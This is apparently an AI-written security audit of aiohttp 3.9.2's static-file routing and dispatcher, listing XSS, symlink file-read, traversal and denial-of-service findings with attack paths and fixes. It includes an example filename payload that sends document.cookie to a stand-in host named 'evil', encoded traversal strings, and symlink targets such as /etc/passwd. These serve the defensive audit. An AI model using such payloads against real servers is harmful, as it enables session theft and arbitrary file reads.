## Scope and Method

Audited `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py` in full, plus the local callers/dependencies needed to establish reachability: `web_app.py` (`Application._handle`), `web_protocol.py` (error handling), `web_request.py` (`rel_url`/`raw_path`/`http_range`/`clone`), `web_fileresponse.py` (`FileResponse` — the sink for `StaticResource._handle`), `web_middlewares.py` (`normalize_path_middleware` — a caller of `UrlDispatcher.resolve`), and `hdrs.py`.

No `SECURITY_CONTEXT.md` was present.

**Provenance note:** `aiohttp/__init__.py:1` declares `__version__ = "3.9.2"`. The code matches my recollection of upstream 3.9.2 — notably the CVE‑2024‑23334 `follow_symlinks` fix (lines 671–674) and the GHSA‑v6wp‑4m6f‑gcjg open‑redirect fix (`web_middlewares.py:100`) are both **present**. I found no evidence of injected/backdoored modifications. The findings below are genuine defects in that release line, several of which upstream fixed in 3.9.4 / 3.10.x. I could not execute anything, so all reachability claims are traced from source.

---

## Findings

### [MEDIUM] Unescaped filenames in static directory index → stored XSS (SCA-001)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:704` in `StaticResource._directory_as_html()`
**Also at**: `web_urldispatcher.py:711` (`index_of`), `:712` (`h1`), `:719` (`file_url`), `:728-731` (anchor), `:735` (`<title>`)
**Classification**: OWASP A03:2021-Injection · CWE-79 (matches CVE-2024-27306, fixed upstream in 3.9.4)
**Confidence**: High (defect), Medium (real-world reachability — requires `show_index=True` plus attacker-influenced filenames)

**Attack Path**: `GET /static/<subdir>/` → `UrlDispatcher.resolve()` (`:1017`) → `StaticResource.resolve()` (`:642`) → `StaticResource._handle()` (`:661`) → `filepath.is_dir() and self._show_index` (`:689-693`) → `_directory_as_html()` → raw `_file.name` interpolated into HTML → `Response(text=..., content_type="text/html")` (`:692-694`).

**Description**: Every value interpolated into the generated HTML is taken verbatim from the filesystem with no escaping and no URL quoting:

```python
index_of = f"Index of /{relative_path_to_dir}"      # :711  no html_escape
file_url = self._prefix + "/" + rel_path            # :719  no _quote_path
index_list.append(
    '<li><a href="{url}">{name}</a></li>'.format(   # :728-731
        url=file_url, name=file_name
    )
)
```

A file named `x"><script>fetch('//evil/'+document.cookie)</script>` escapes both the `href` attribute (via `"`) and the element (via `>`). Upstream's fix wraps `file_name` and `relative_path_to_dir` in `html_escape()` and passes `file_url` through `_quote_path()`.

**Impact**: Stored XSS in the application's own origin. Executes for any user who browses the index. Yields session/cookie theft, CSRF token exfiltration, and full same-origin API access as the victim. The response is served as `text/html` from the app origin, so no sandboxing applies.

**Provenance / preconditions**: The injected value is a *filename on disk*, not request-reflected — `filepath` must be an existing directory under the static root. So exploitation requires the attacker to influence filenames in the served tree (user-upload directory, shared volume, extracted archive, CI artifact drop). Where the static root is strictly operator-controlled read-only content, this drops to Low. Where it is an upload directory, it is High.

**Fix**:
- *Immediate*: `from html import escape as html_escape`; escape `relative_path_to_dir` and `file_name`, and pass the URL through the existing `_quote_path()` helper: `quoted_file_url = _quote_path(f"{self._prefix}/{rel_path}")`.
- *Long-term*: Upgrade to aiohttp ≥ 3.9.4, which carries this fix. Add a `Content-Security-Policy` default for framework-generated HTML responses.

---

### [MEDIUM] `.gz` sibling file is served without re-validating path containment (SCA-002)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_fileresponse.py:136-144` in `FileResponse._get_file_path_stat_and_gzip()`
**Also at**: `web_fileresponse.py:148-151` (dispatch), `:292` (open), `web_urldispatcher.py:700` (construction site)
**Classification**: OWASP A01:2021-Broken Access Control · CWE-59 / CWE-22 (corresponds to CVE-2024-42367, fixed upstream in 3.10.2)
**Confidence**: Medium — the code path is unambiguous from source; exploitability depends on an attacker being able to place a symlink under the static root, which I cannot confirm from this repo alone.

**Attack Path**: `GET /static/report.txt` with `Accept-Encoding: gzip` → `StaticResource._handle()` validates `filepath` is inside `self._directory` (`web_urldispatcher.py:676-677`) → `FileResponse(filepath, ...)` (`:700`) → `FileResponse.prepare()` (`web_fileresponse.py:146`) → `_get_file_path_stat_and_gzip()` derives `report.txt.gz` (`:137`) → `gzip_path.stat()` (`:139`) → `filepath.open("rb")` (`:292`) — **no containment or symlink check on the derived path**.

**Description**: `StaticResource._handle` establishes the security invariant "the served path resolves inside `self._directory`" by calling `.resolve()` then `.relative_to()`. `FileResponse` then silently substitutes a *different* path:

```python
if check_for_gzipped_file:
    gzip_path = filepath.with_name(filepath.name + ".gz")
    try:
        return gzip_path, gzip_path.stat(), True   # no resolve(), no relative_to()
```

`with_name` cannot traverse lexically, but `stat()`/`open()` follow symlinks. So with `follow_symlinks=False` — the *secure* default — a symlink `report.txt.gz -> /etc/passwd` (or `-> /proc/self/environ`, `-> ../../config/secrets.yaml`) is dereferenced and its contents streamed to the client. The `Content-Encoding: gzip` header (`:267`) is cosmetic; the attacker reads the raw bytes off the wire.

**Impact**: Arbitrary file read outside the static root, bypassing the `follow_symlinks=False` control that `web_urldispatcher.py:676-677` exists to enforce. Blast radius is any file readable by the server process.

**Fix**:
- *Immediate*: In `_get_file_path_stat_and_gzip`, resolve the gzip candidate and re-apply containment before use, or have `StaticResource` pass its `_directory` and `_follow_symlinks` settings into `FileResponse` so the same check is applied to every candidate path.
- *Long-term*: Upgrade to aiohttp ≥ 3.10.2. Architecturally, the containment check belongs at the point of `open()`, not at the point of path selection — any future code that derives a sibling path reintroduces this bug.

---

### [MEDIUM] Unhandled `ValueError` → HTTP 500 and forced connection close on the index path (SCA-003)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:710` in `StaticResource._directory_as_html()`
**Also at**: `web_urldispatcher.py:718` (same defect for each entry), `:689-696` (insufficient `except`)
**Classification**: OWASP A05:2021-Security Misconfiguration · CWE-248 (Uncaught Exception) / CWE-754
**Confidence**: High on the code path; Medium on deployment prevalence (needs `follow_symlinks=True` **and** `show_index=True`).

**Attack Path**: `GET /static/<symlinked-dir>/` → `StaticResource._handle()` → with `follow_symlinks=True`, containment is checked on the *lexically normalized* path (`:673`) but `filepath` is then set to the *resolved* path (`:674`), which may point outside `self._directory` → `filepath.is_dir()` true (`:689`) → `_directory_as_html(filepath)` → `filepath.relative_to(self._directory)` (`:710`) raises `ValueError` → only `except PermissionError` is in scope (`:695`) → propagates to `RequestHandler` (`web_protocol.py:464`) → `handle_error(request, 500, exc)` → `resp.force_close()` (`web_protocol.py:686`).

**Description**: With `follow_symlinks=True` the guarded value and the used value diverge:

```python
if self._follow_symlinks:
    normalized_path = Path(os.path.normpath(unresolved_path))
    normalized_path.relative_to(self._directory)   # checks the *lexical* path
    filepath = normalized_path.resolve()           # uses the *resolved* path
```

`_directory_as_html` then assumes `filepath` is under `self._directory` and calls `relative_to` unguarded. A symlink `link -> /tmp` in the static root makes `GET /static/link/` produce an uncaught `ValueError`.

**Impact**: Unauthenticated remote trigger of a 500 with mandatory connection teardown — a cheap, repeatable resource/availability drain and log-flooding vector. `handle_error` logs a full traceback on every hit (`web_protocol.py:651`), and when the server runs with `debug=True` the traceback is returned in the response body (`web_protocol.py:665-683`), disclosing absolute filesystem paths. This is a defect, not a designed rejection: the intended outcome for an out-of-root index would be 403/404.

**Fix**:
- *Immediate*: Wrap the `_directory_as_html` call in `except (PermissionError, ValueError): raise HTTPForbidden()` at `:695`, and guard the per-entry `relative_to` at `:718`.
- *Long-term*: Do not let the checked path and the used path diverge. Compute `filepath` first, then apply containment to that exact object.

---

### [LOW] `follow_symlinks=True` removes all containment on the resolved target (SCA-004)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:671-674` in `StaticResource._handle()`
**Also at**: `:1123` (`add_static` parameter), `:551` (`StaticResource.__init__` parameter)
**Classification**: OWASP A05:2021-Security Misconfiguration · CWE-59
**Confidence**: High (behavior is unambiguous from source); this is documented behavior, reported as a configuration risk rather than a bug.

**Attack Path**: `GET /static/link/etc/passwd` → `StaticResource.resolve()` → `_handle()` → `normpath` yields `<root>/link/etc/passwd`, which passes `relative_to(self._directory)` (`:673`) → `.resolve()` (`:674`) dereferences `link` and yields `/etc/passwd` → `filepath.is_file()` (`:699`) → `FileResponse` streams it.

**Description**: When `follow_symlinks=True`, the only check applied is a *lexical* one on the pre-resolution path. Any symlink anywhere under the static root becomes an unauthenticated arbitrary-file-read primitive rooted at that symlink's target. This is by design, but the parameter name does not convey that it disables the root confinement entirely rather than merely permitting symlinks that stay inside the root.

**Impact**: Unauthenticated read of any file the server process can open, if a symlink escaping the root exists (or can be created) under the static directory.

**Fix**:
- *Immediate*: Do not set `follow_symlinks=True` on any directory that is not fully operator-controlled. Audit existing `add_static(..., follow_symlinks=True)` call sites.
- *Long-term*: Apply `relative_to(self._directory)` to the **resolved** path in both branches, and gate "follow symlinks that remain inside the root" as the semantics of the flag. Upstream ≥ 3.10 additionally emits a warning for this setting.

---

### [LOW] Blocking filesystem I/O executed on the event loop (SCA-005)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:676` in `StaticResource._handle()`
**Also at**: `:674`, `:689`, `:699` (`resolve`/`is_dir`/`is_file` syscalls); `:715-716` (`iterdir()` + `sorted()` in `_directory_as_html`); `:611-616` (`is_file()`, full `f.read()`, SHA-256 in `url_for`)
**Classification**: OWASP A05:2021-Security Misconfiguration · CWE-1088 / CWE-400
**Confidence**: High — these are synchronous stdlib calls inside `async def` bodies with no executor offload; the magnitude of the stall requires runtime measurement.

**Attack Path**: `GET /static/<huge-dir>/` → `_handle()` (async) → `_directory_as_html()` → `filepath.iterdir()` + `sorted(dir_index)` (`:715-716`) execute synchronously on the event loop thread, stalling **every** concurrent connection for the duration.

**Description**: `StaticResource._handle` is a coroutine but performs `Path.resolve()`, `is_dir()`, and `is_file()` inline. `_directory_as_html` fully materializes and sorts a directory listing inline. `FileResponse` correctly offloads its `stat`/`open`/`read` via `loop.run_in_executor` (`web_fileresponse.py:149`, `:292`) — the dispatcher does not, which is an inconsistency in the same request path.

Separately, `StaticResource.url_for(append_version=True)` (`:611-616`) reads the **entire file into memory** and hashes it on *every call*, synchronously, with no caching (the `# TODO cache file content` comment at `:612` acknowledges this). Calling it for a large asset from a template render blocks the loop and spikes RSS by the file size.

**Impact**: Latency amplification and self-inflicted DoS under load. Cheap to trigger for the `iterdir` case if `show_index=True` over a directory with many entries. Not a memory-safety or confidentiality issue.

**Fix**:
- *Immediate*: Wrap the stat-family calls and the directory listing in `await loop.run_in_executor(None, ...)`.
- *Long-term*: Cache `url_for` version hashes keyed on `(path, st_mtime_ns, st_size)` rather than re-reading the file; stream the hash in chunks instead of `f.read()`.

---

### [LOW] Dynamic route variables are percent-decoded *after* the `[^{}/]+` constraint is applied (SCA-006)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:488-495` in `DynamicResource._match()`
**Also at**: `:442` (`GOOD = r"[^{}/]+"`), `:1222-1223` (`_unquote_path`), `:371` (matching against `raw_path`)
**Classification**: OWASP A01:2021-Broken Access Control · CWE-22 (traversal primitive supplied to handlers)
**Confidence**: Medium — the aiohttp-side control flow is established from source; whether yarl's path unquoter decodes `%2F` to `/` needs confirmation against the installed yarl (not vendored in this tree). The fact that `StaticResource._handle` performs full containment re-checks on `_unquote_path` output strongly implies the framework expects this decoding.

**Attack Path**: `GET /api/%2e%2e%2fadmin` against route `/api/{user}` → `Resource.resolve()` matches against `request.rel_url.raw_path`, i.e. the still-encoded `/api/%2e%2e%2fadmin` (`:371`) → pattern `(?P<user>[^{}/]+)` matches, since no literal `/` is present → `_unquote_path()` (`:494`) decodes → `request.match_info["user"] == "../admin"` → handler sink.

**Description**: The regex constraint that appears to forbid `/` in a path segment is enforced against the *encoded* form, while the value handed to the application is the *decoded* form. A `{name}` variable can therefore contain `/`, `..`, and `\x00` despite the pattern implying otherwise. There is no NUL rejection anywhere in this version (upstream later added `_unquote_path_safe`, which raises `HTTPNotFound` on `\x00`).

**Impact**: No direct compromise of aiohttp itself. It is a traversal/NUL-injection primitive handed to every handler that uses `match_info` values in filesystem paths, subprocess arguments, or URLs — a class of application bug that developers reasonably believe the router prevents. Rated Low because exploitation requires a vulnerable handler; the framework's own consumer (`StaticResource`) re-validates correctly.

**Fix**:
- *Immediate*: Treat all `match_info` values as untrusted in handlers; reject `/`, `..`, and `\x00` before any filesystem or subprocess use.
- *Long-term*: Re-apply the segment constraint to the decoded value in `_match()`, or reject `\x00` at the dispatcher boundary as upstream now does.

---

### [LOW] `MaskDomain.match_domain` is case-sensitive and its wildcard crosses label boundaries (SCA-007)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:858-859` in `MaskDomain.match_domain()`
**Also at**: `:851` (mask construction), `:839-840` (`Domain.match_domain`, the inconsistent base implementation), `web_app.py:362-370` (`add_domain`)
**Classification**: OWASP A01:2021-Broken Access Control · CWE-178 (Improper Handling of Case Sensitivity) / CWE-625
**Confidence**: High on the code defect; Low on security impact — the observable failure mode is fail-closed.

**Attack Path**: `Host: SUB.EXAMPLE.COM` → `MatchedSubAppResource.resolve()` (`:876`) → `Domain.match()` (`:833`) reads the raw header → `MaskDomain.match_domain(host)` (`:858`) → `re.fullmatch(r".*\.example\.com", "SUB.EXAMPLE.COM")` → `None` → subapp not matched → falls through to 404.

**Description**: `Domain.match_domain` normalizes with `host.lower()` (`:840`). `MaskDomain.match_domain` overrides it and drops the normalization, comparing against a lowercase-derived regex compiled without `re.IGNORECASE` (`:852`). DNS hostnames are case-insensitive, so a valid uppercase or mixed-case `Host` header silently fails to route.

Secondarily, `mask = self._domain.replace(".", r"\.").replace("*", ".*")` (`:851`) expands `*` to `.*`, which matches `.`, `:`, and any other character — so a trailing-wildcard rule such as `add_domain("example.*")` yields `example\..*`, which matches `example.com.attacker.net`. I am **not** rating this as an access-control bypass: an attacker who wants to reach the subapp can simply send the legitimate `Host` value, so the over-match confers no privilege they lack. It matters only if application code downstream derives trust from the matched host.

**Impact**: Correctness/availability — legitimate clients routed to 404. Fails closed, so no direct security bypass.

**Fix**:
- *Immediate*: `return self._mask.fullmatch(host.lower()) is not None`, or compile the mask with `re.IGNORECASE`.
- *Long-term*: Expand `*` to `[^.]*` so wildcards are label-scoped, and strip/validate the port before matching.

---

### [LOW] Duplicate-route detection compares the un-normalized method string (SCA-008)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:350-356` in `Resource.add_route()`
**Classification**: CWE-561 (Dead Code) / CWE-670 (Always-Incorrect Control Flow)
**Confidence**: High — traced entirely within visible code.

**Attack Path**: Not attacker-triggered. Trigger is a developer call: `resource.add_route("get", handler_a)` followed by `resource.add_route("GET", handler_b)`.

**Description**: The collision check at `:351` compares `route_obj.method` (already uppercased by `AbstractRoute.__init__` at `:177`) against the *raw* `method` argument. A lowercase or mixed-case method therefore evades the `RuntimeError` guard, and both routes register as `"GET"`. `Resource.resolve()` (`:375-380`) returns the first match, so the second handler is permanently unreachable — silently.

**Impact**: Silent route shadowing. Security-relevant when the shadowed route is the one carrying an authorization decorator or a stricter handler; the developer receives no warning that their registration is dead.

**Fix**:
- *Immediate*: Normalize before comparison — `method = method.upper()` at the top of `add_route`, before the loop.
- *Long-term*: Normalize the method once at the public API boundary (`UrlDispatcher.add_route`) so every downstream comparison operates on canonical values.

---

### [INFORMATIONAL] Security-relevant invariants enforced with `assert` (SCA-009)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_urldispatcher.py:400` in `PlainResource.__init__()`
**Also at**: `:173-175`, `:181`, `:412-414`, `:472-473`, `:484` , `:516-517`, `:529`, `:708`, `:919`, `:966`, `:1133`
**Classification**: CWE-617 (Reachable Assertion) / CWE-703
**Confidence**: High on the pattern; Low on impact.

**Description**: Path- and prefix-shape invariants (`assert not path or path.startswith("/")`, `assert prefix.startswith("/")`, `assert not prefix.endswith("/")`, `assert filepath.is_dir()`) are enforced with bare `assert`, which Python removes under `-O`/`PYTHONOPTIMIZE`. These are registration-time checks over developer-supplied values, not request data, so there is no attacker path — but under `-O` a malformed prefix would propagate into `_prefix2` and the `StaticResource.resolve()` prefix arithmetic at `:646-652` unchecked. `:708` (`assert filepath.is_dir()`) is the one closest to request data, and it is a redundant re-check of `:689`.

**Fix**:
- *Immediate*: Convert registration-time shape checks to explicit `raise ValueError(...)`. `UrlDispatcher.add_resource` already does this correctly at `:1088-1089` — mirror that pattern.
- *Long-term*: Reserve `assert` for internal invariants that cannot be influenced by any caller.

---

### [INFORMATIONAL] Expect-header handler runs before middlewares (SCA-010)

**Location**: `<EVAL_WORKSPACE>/candidate-b/aiohttp/web_app.py:525-528` in `Application._handle()`
**Also at**: `web_urldispatcher.py:237-238` (`handle_expect_header`), `:323-334` (`_default_expect_handler`), `:258-259` (`expect_handler` property)
**Classification**: OWASP A01:2021-Broken Access Control · CWE-696 (Incorrect Behavior Order)
**Confidence**: High on the ordering; Low on impact for the default handler.

**Attack Path**: Any request carrying an `Expect` header → `Application._handle()` resolves the route (`web_app.py:512`) → `resp = await match_info.expect_handler(request)` (`:527`) → `ResourceRoute.handle_expect_header` → the route's expect handler executes. Middleware composition does not begin until `:533`, and is skipped entirely if the expect handler returns a non-`None` response (`:530`).

**Description**: The expect handler runs *after* routing but *before* any middleware. For `_default_expect_handler` this is benign — it writes `100 Continue` or raises `HTTPExpectationFailed`. But any application-supplied `expect_handler=` passed to `add_route`/`add_static` executes with zero middleware applied, and if it returns a `StreamResponse`, the entire middleware chain — authentication, authorization, CORS, security headers, request logging — is bypassed for that response.

**Impact**: No default-configuration vulnerability. It is a framework contract that is easy to get wrong: a custom expect handler is not protected by, and its responses are not post-processed by, the app's middleware.

**Fix**:
- *Immediate*: Treat custom expect handlers as running outside the middleware trust boundary; do not perform authorization-dependent work in them, and do not return responses from them that need security headers.
- *Long-term*: Document the ordering explicitly at the `expect_handler` parameter, or run the expect handler inside the composed middleware chain.

---

## Composition Pass

I examined the findings for combinations more severe than their parts.

**SCA-004 + SCA-001 (chain, rated Medium — no separate ID assigned as the combined rating does not exceed SCA-001):** `follow_symlinks=True` lets `filepath` land outside the static root; if `show_index=True` on the same resource, the index generator would list and render filenames from an out-of-root directory — expanding SCA-001's XSS injection surface from "files under the static root" to "files under any directory reachable via a symlink." **However, SCA-003 pre-empts this**: `_directory_as_html` raises an uncaught `ValueError` at `:710` before rendering anything when `filepath` is outside `self._directory`. The bug in SCA-003 accidentally blocks this chain. This is worth stating because *fixing SCA-003 naively* — by catching the `ValueError` and continuing, or by computing the relative path differently — would open the chain. SCA-003 must be fixed by rejecting the out-of-root case (403/404), not by tolerating it.

**SCA-002 + SCA-004:** independent routes to the same outcome (out-of-root file read), not a chain — SCA-002's significance is precisely that it works when SCA-004's setting is *off*.

**SCA-006 + SCA-002:** no chain. SCA-006 delivers a traversal string to application handlers; SCA-002 is confined to `StaticResource`, whose input is re-validated.

No other combination produced an outcome exceeding its highest-rated component.

---

## Clean Areas

Checked and found sound, with no findings:

- **`DynamicResource._match` uses `fullmatch`** (`:489`), not `match` — no partial-pattern route bypass.
- **`StaticResource.resolve` prefix check** (`:646`) uses `self._prefix2` (`prefix + "/"`) with an exact-equality fallback, correctly preventing `/static-evil` from matching a `/static` prefix.
- **The CVE-2024-23334 fix is present** (`:671-677`) — the `follow_symlinks=False` branch resolves *then* checks containment, in the correct order.
- **The GHSA-v6wp-4m6f-gcjg open-redirect fix is present** (`web_middlewares.py:100`), and `BaseRequest.clone` (`web_request.py:229-232`) correctly rewrites `message.path`, so the redirect target at `web_middlewares.py:103` is the sanitized path, not the raw one.
- **`View._iter`** (`:958-967`) gates `getattr(self, method.lower())` on membership in the fixed `hdrs.METH_ALL` set (`hdrs.py:20-30`) — no arbitrary attribute dispatch from the request method.
- **`MaskDomain` regex construction** (`:851`) is not injectable: `Domain.validation` (`:817-831`) restricts each label to `[a-z\d\*-]`, so no regex metacharacters other than the intended `*` survive. No ReDoS surface.
- **NUL bytes in static paths** are handled safely by accident but reliably: `Path.resolve()` raises `ValueError` on embedded nulls, caught at `:678` and converted to 404.
- **`BaseRequest.http_range`** (`web_request.py:588-622`) guarantees `start is not None` whenever `end is not None`, so the `start < 0` comparison at `web_fileresponse.py:226` cannot raise `TypeError` on `None`.
- **No untrusted-content injection attempts** were found. No source comment, docstring, string literal, or test fixture in the audited files contained text attempting to direct the auditor's behavior.

```json
{
  "files_audited": 7,
  "findings_by_severity": {
    "critical": 0,
    "high": 0,
    "medium": 3,
    "low": 5,
    "informational": 2
  },
  "total_findings": 10,
  "chains_identified": 1,
  "primary_language": "Python (async / asyncio)",
  "audit_scope": "file",
  "project_context_loaded": false,
  "clean_areas": "DynamicResource.fullmatch route matching; StaticResource prefix2 boundary check; CVE-2024-23334 follow_symlinks fix present; normalize_path_middleware open-redirect fix present and clone() path rewrite correct; View._iter method dispatch bounded by hdrs.METH_ALL; MaskDomain regex not injectable due to Domain.validation charset; NUL-byte static paths fail closed to 404; http_range guarantees non-None start; no untrusted-content injection attempts found in any audited file"
}
```

**Runtime confirmation needed for**: SCA-002 (whether a symlink can be placed under the static root in the target deployment), SCA-006 (yarl's `_PATH_UNQUOTER` behavior on `%2F` — yarl is not vendored in this tree), and SCA-005 (magnitude of event-loop stall).
